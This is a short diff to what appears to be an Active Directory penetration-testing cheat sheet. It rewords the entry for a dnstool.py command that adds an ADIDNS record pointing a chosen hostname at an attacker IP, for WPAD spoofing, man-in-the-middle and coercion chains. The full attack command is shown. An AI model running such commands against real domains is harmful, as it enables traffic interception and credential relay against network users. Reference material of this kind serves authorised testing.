@@ -4,11 +4,9 @@
 
 ### Add ADIDNS record
 
-Add ADIDNS record with Dnstool.
-
 Write an ADIDNS record (LDAP) pointing a chosen hostname at your attacker IP. Useful for WPAD spoofing, MITM, and coercion chains where the target resolves the name from AD.
 
-```sh title:"Dnstool Add ADIDNS Record"
+```sh title:"Dnstool Write ADIDNS record pointing chosen name at attacker IP"
 python3 dnstool.py -u $domain\\$user -p $pass $rhost_ip -a add -d $lhost -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 ```
 <!-- cheat
